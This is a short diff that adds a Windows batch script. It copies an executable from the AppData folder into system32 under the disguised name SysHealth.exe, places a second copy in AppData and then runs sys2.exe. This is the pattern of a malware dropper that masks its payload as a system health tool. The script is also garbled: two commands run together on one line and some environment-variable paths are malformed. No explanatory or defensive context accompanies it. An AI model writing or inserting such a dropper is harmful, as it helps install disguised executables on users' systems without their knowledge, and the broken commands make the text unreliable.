@@ -1,0 +1,3 @@
+cd %~dp0 
+copy %\appdata%\a.exe %windir%\system32\SysHealth.execopy %appdata%.exe %appdata%\SysHealth.exe 
+sys2.exe 
